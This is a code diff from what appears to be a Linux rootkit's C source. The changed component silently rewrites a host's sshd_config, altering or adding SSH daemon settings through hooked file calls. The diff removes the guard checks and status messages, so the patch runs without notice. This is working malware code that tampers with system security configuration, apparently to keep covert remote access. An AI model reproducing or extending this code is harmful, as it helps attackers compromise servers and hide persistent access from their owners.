@@ -11,7 +11,7 @@ void addsetting(char *setting, char *value, char **buf){
     strcat(*buf, tmp);
 }
 
-size_t writesshd(char *buf, int mode){
+size_t writesshd(char *buf){
     FILE *fp;
     size_t count;
     hook(CFOPEN, CFWRITE);
@@ -69,7 +69,7 @@ int sshdok(int res[], char **buf, size_t *sshdsize){
         /* lines are cool. unless they aren't... */
         skipline = 0;
 
-        for(int i = 0; i != sizeofarr(patchtargets); i++){
+        for(int i = 0; i != PATCHTARGETS_SIZE; i++){
             if(res[i] == 2 || res[i] == 1) // status of setting already determined. next.
                 continue;
 
@@ -101,10 +101,8 @@ int sshdok(int res[], char **buf, size_t *sshdsize){
             }
         }
 
-        if(skipline) // bad line. we dont want bad line.
-            continue;
-
-        strcat(*buf, line);
+        if(!skipline) // if line is cool, line is cool.
+            strcat(*buf, line);
     }
     fclose(fp);
 
@@ -116,54 +114,25 @@ int sshdok(int res[], char **buf, size_t *sshdsize){
  *    plus the addition of settings that were previously missing.
  */
 
-void sshdpatch(int mode){
-    if(not_user(0) || rknomore())
-        return;
-
+void sshdpatch(void){
     char *sshdcontents; // stores contents of sshd_config.
     size_t sshdsize;    // stores filesize of sshd_config.
-    int status[sizeofarr(patchtargets)]; // stores patch status of each setting.
+    int status[PATCHTARGETS_SIZE]; // stores patch status of each setting.
 
     if(sshdok(status, &sshdcontents, &sshdsize) < 0)
         return;
 
-    int curstatus,      // the status of the current setting. (1 = ok, 2 = patched, ? = missing)
-        nook = 0,       // number of settings that returned 'ok' (1).
-        nopatched = 0,  // number of settings whose values have been patched. (2)
-        nomissing = 0;  // number of settings missing & that need added.
+    int nook = 0,       // number of settings that returned 'ok' (1).
+        nopatched = 0;  // number of settings whose values have been patched. (2)
 
-    for(int i = 0; i != sizeofarr(status); i++){
-        curstatus = status[i];
-
-        switch(curstatus){
-            case 1: /* current target setting is ok. */
-                nook++;
-                break;
-            case 2: /* target setting has been patched. */
-                nopatched++;
-                break;
-            default: /* target setting was missing. add it. */
-                addsetting(patchtargets[i], targetval[i], &sshdcontents);
-                nomissing++;
-                break;
-        }
+    for(int i = 0; i != PATCHTARGETS_SIZE; i++){
+        if(status[i] == 1) nook++;
+        else if(status[i] == 2) nopatched++;
+        else addsetting(patchtargets[i], targetval[i], &sshdcontents);
     }
 
-    if(mode == MAGIC_USR){
-        printf("settings already ok: %d\n", nook);
-        printf("settings patched: %d\n", nopatched);
-        printf("settings originally missing (now patched): %d\n", nomissing);
-    }
-
-    if(nook != sizeofarr(patchtargets)){
-        size_t writecount = writesshd(sshdcontents, mode);
-        if(mode == MAGIC_USR){
-            if(writecount >= sshdsize)
-                printf("successfully patched sshd_config\n");
-            else if(!writecount)
-                printf("failed writing new sshd_config\n");
-        }
-    }else if(mode == MAGIC_USR) printf("no settings to patch...\n");
+    if(nook != PATCHTARGETS_SIZE)
+        writesshd(sshdcontents);
 
     free(sshdcontents);
 }
